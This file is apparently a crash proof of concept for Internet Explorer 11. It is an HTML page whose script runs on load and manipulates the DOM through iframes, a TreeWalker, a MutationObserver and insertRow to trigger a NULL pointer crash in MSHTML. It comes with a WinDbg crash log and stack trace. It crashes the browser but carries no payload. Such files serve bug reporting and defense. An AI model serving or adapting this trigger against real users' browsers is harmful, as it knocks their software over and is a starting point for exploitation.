@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta http-equiv="content-type" content="text/html; charset=UTF-8">
+  <meta http-equiv="Expires" content="0" />
+  <meta http-equiv="Cache-Control" content="no-store, no-cache, must-revalidate" />
+  <meta http-equiv="Cache-Control" content="post-check=0, pre-check=0" />
+  <meta http-equiv="Pragma" content="no-cache" />
+  <style type="text/css">
+   body{
+        background-color:lime;
+        font-color:red;
+   };
+  </style>
+  <script type='text/javascript'></script> 
+  <script type="text/javascript" language="JavaScript">
+/*******************************************************************************
+6e57a325 ff430c          inc     dword ptr [ebx+0Ch]
+6e57a328 8b4310          mov     eax,dword ptr [ebx+10h]
+6e57a32b 8945f4          mov     dword ptr [ebp-0Ch],eax
+6e57a32e 8b401c          mov     eax,dword ptr [eax+1Ch]
+6e57a331 8b7820          mov     edi,dword ptr [eax+20h] ds:002b:00000020=????????
+6e57a334 83c024          add     eax,24h
+6e57a337 8945f0          mov     dword ptr [ebp-10h],eax
+6e57a33a 3bf8            cmp     edi,eax
+--------------------------------------------------------------------------------
+(1168.1134): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+eax=00000000 ebx=17916fe8 ecx=00610000 edx=00000000 esi=00000000 edi=17916ff4
+eip=6e57a331 esp=09b2c010 ebp=09b2c030 iopl=0         nv up ei pl nz na po nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010202
+MSHTML!CTableOMSectionCache::BuildCache+0x4b:
+6e57a331 8b7820          mov     edi,dword ptr [eax+20h] ds:002b:00000020=????????
+0:007> k
+ChildEBP RetAddr  
+09b2c030 6e57a2da MSHTML!CTableOMSectionCache::BuildCache+0x4b
+09b2c03c 6e579623 MSHTML!CTableSection::GetOMCache+0x1b
+09b2c060 6e57a4a8 MSHTML!CTableOMCache::insertRow+0xa5
+09b2c084 6e5790a0 MSHTML!CTable::ie9_insertRow+0x48
+09b2c0d0 6fdfe0da MSHTML!CFastDOM::CHTMLTableElement::Trampoline_insertRow+0x80
+09b2c140 6ffe82d6 jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x19d
+09b2c1d4 6ff4e6cf jscript9!DListBase<CustomHeap::Page>::DListBase<CustomHeap::Page>+0x58526
+09b2c1f0 6fdfd251 jscript9!Js::CrossSite::DefaultThunk+0xa2
+09b2c498 6fdfd5a9 jscript9!Js::InterpreterStackFrame::Process+0x1e62
+09b2c5a4 0d2e0fd1 jscript9!Js::InterpreterStackFrame::InterpreterThunk<1>+0x200
+WARNING: Frame IP not in any known module. Following frames may be wrong.
+09b2c5b0 6fdf6565 0xd2e0fd1
+09b2c5fc 6fdf6b18 jscript9!Js::JavascriptFunction::CallFunction<1>+0x91
+09b2c670 6fdf6a4d jscript9!Js::JavascriptFunction::CallRootFunction+0xb5
+09b2c6b8 6fdf69e0 jscript9!ScriptSite::CallRootFunction+0x42
+09b2c704 6ff9f7bd jscript9!ScriptSite::Execute+0xd2
+09b2c768 6e481aab jscript9!ScriptEngineBase::Execute+0xc7
+09b2c7a8 6e271bdb MSHTML!CMutationObserver::PerformMicrotaskCheckpoint+0xc0
+09b2c82c 6e32f1f1 MSHTML!CObserverManager::InvokeObserversForCheckpoint+0x78
+09b2c83c 6e35af27 MSHTML!PerformMicrotaskCheckpoint+0x3b
+09b2c884 6dcae07a MSHTML!GlobalWndOnMethodCall+0x18e
+09b2c8d8 754c62fa MSHTML!GlobalWndProc+0x103
+09b2c904 754c6d3a user32!InternalCallWinProc+0x23
+09b2c97c 754c77c4 user32!UserCallWinProcCheckWow+0x109
+09b2c9dc 754c788a user32!DispatchMessageWorker+0x3b5
+09b2c9ec 705ea9fc user32!DispatchMessageW+0xf
+09b2fbb8 70646b18 IEFRAME!CTabWindow::_TabWindowThreadProc+0x464
+09b2fc78 753a2d3c IEFRAME!LCIETab_ThreadProc+0x3e7
+09b2fc90 74373a31 iertutil!CMemBlockRegistrar::_LoadProcs+0x67
+09b2fcc8 769c336a IEShims!NS_CreateThread::DesktopIE_ThreadProc+0x94
+09b2fcd4 76ef9902 kernel32!BaseThreadInitThunk+0xe
+09b2fd14 76ef98d5 ntdll!__RtlUserThreadStart+0x70
+09b2fd2c 00000000 ntdll!_RtlUserThreadStart+0x1b
+********************************************************************************/
+      var tree_w = null;                  
+      
+      function handle0() {
+               tree_w.currentNode.insertRow();
+      }
+      
+      function handle1() {
+               tree_w.currentNode.innerHTML = "NAJ";
+      }
+      
+			function testcase()
+			{
+			      var e1_frame = document.getElementById("e1"); 
+				    var doc = document.getElementById("t1").contentWindow.document; 
+				    doc.body.appendChild(e1_frame.contentWindow.document.createElement("b")); 
+				    doc.body.appendChild(e1_frame.contentWindow.document.createElement("table")); 
+				    document.getElementById("e1").removeNode(false); 
+				    var trg = doc.getElementsByTagName("*")[4]; 
+				    tree_w = doc.createTreeWalker(trg,4,{ acceptNode: function(node) { return 4; } },true); 
+			      var ob = new MutationObserver(handle0); 
+			          ob.observe(doc,{ attributes: true, childList: true, characterData: true, subtree: true });
+				    trg.addEventListener("DOMNodeInserted",handle1,true); 
+				    trg.insertAdjacentHTML("afterend","<b>hi</b>"); 
+			}
+  </script>
+  <title>IE11 MSHTML!CTableOMSectionCache::BuildCache NULL PTR</title>
+  </head>
+  <body onload='testcase();'>
+   <iframe src='about:blank' id='t1' width="100%"></iframe>
+   <iframe width="100%" src='about:blank' id='e1'></iframe>
+  </body>
+</html>
